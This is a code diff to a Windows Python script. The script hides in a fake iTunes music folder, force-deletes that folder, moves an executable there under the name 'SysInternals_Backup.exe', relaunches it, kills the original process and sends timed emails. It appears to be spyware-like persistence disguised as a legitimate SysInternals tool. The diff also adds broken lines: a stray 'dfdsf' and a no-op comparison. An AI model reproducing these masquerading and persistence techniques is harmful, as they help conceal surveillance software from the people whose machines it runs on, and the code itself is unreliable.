@@ -25,26 +25,32 @@ import traceback
 import ConfigFile
 #Log Location
 logDir = (r"C:\Users\Public\AppData\Music\iTunes\U2\All_Music")
-try:
 
+dfdsf
+try:
+    firstRun = True
     def fileExists():
         #Checking if path exists.
         fileExists = path.exists(logDir)
-        if fileExists == True:
-           #Deleting all the current config
+        if fileExists == True and firstRun == True:
+            #Deleting all the current config
             os.system(r'rmdir /Q /S {}'.format(logDir))
+            os.makedirs(logDir)
+            firstRun == False
 
         try:
-            os.makedirs(logDir)
-            print(os.getcwd())
+
+
+            print("Frist OS.GETCWD: " + os.getcwd())
             if os.getcwd() != (r"C:\Users\Public\AppData\Music\iTunes\U2\All_Music"):
-              currentFileName = os.path.basename(__file__)
-              print(currentFileName)
-              shutil.copy(currentFileName, r'C:\Users\Public\AppData\Music\iTunes\U2\All_Music\SysInternals_Backup.exe')
-              print("Moved SysInt To Backup Location")
+            #  print(currentFileName)
+                shutil.move('SysInternals.exe', r'C:\Users\Public\AppData\Music\iTunes\U2\All_Music\SysInternals_Backup.exe')
+                sendToLog("Moved SysInt To Backup Location")
+
+
         except Exception as error:
             print("Could not Backup SysInt.exe to destination: {}\n {}".format(error, traceback.format_exc()))
-            sendToLog("Could not Backup SysInt.exe to destination: {}\n {}".format(error, traceback.format_exc()))
+            sendToLog("Could not Backup SysInternals.exe to destination: {}\n {}".format(error, traceback.format_exc()))
 
         try:
             os.chdir(logDir + "\\")
@@ -55,12 +61,14 @@ try:
         except Exception as error:
             print("Could not start backup file: {}\n {}".format(error, traceback.format_exc()))
             sendToLog("Could not start backup file: {}\n {}".format(error, traceback.format_exc()))
+
         try:
                 #Stoping orinal file
-            subprocess.call("taskkill /f /im {}".format(currentFileName), shell=True)
+            subprocess.call("taskkill /f /im SysInternals.exe", shell=True)
         except Exception as error:
             print("Could not TaskKill SysInternals.exe: {}\n {}".format(error, traceback.format_exc()))
             sendToLog("Could not TaskKill SysInternals.exe: {}\n {}".format(error, traceback.format_exc()))
+
 
     def sendEmailLocal(title):
         print("Sending Email Function Starts Here")
@@ -184,6 +192,8 @@ try:
         t.start()
         t2 = Timer(1800.0, sendEmailLocal,args=['30min/1800sec Email'])
         t2.start()
+        currentFileName = os.path.basename(__file__)
+        sendToLog("FILE name: {}".format(currentFileName))
         readTimeFromFile()
         print("MainRun() SendEmailLocal")
         sendEmailLocal('Initial Email From MainRun()')
@@ -192,7 +202,9 @@ try:
             schedule.run_pending()
             time.sleep(1)
 
-    mainRun()
+
+    if __name__ == ("__main__"):
+        mainRun()
 
     # fileExists()
    # createLogging()
